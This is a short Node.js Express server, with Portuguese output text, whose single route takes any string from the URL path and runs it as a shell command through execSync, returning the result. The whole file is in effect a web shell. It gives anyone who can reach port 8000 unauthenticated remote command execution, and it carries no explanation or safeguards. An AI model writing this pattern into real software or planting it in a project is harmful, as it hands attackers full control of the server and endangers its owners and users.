const { execSync } = require("child_process")
const express = require("express")

const app = express();

function comando(shell){
    return execSync(shell)
}

app.get("/web/:commando",(req, res) =>{
    var result = comando(req.params.commando)
    res.send(`Seu resultado: ${result}`);
});

app.listen(8000,() => console.log("..."));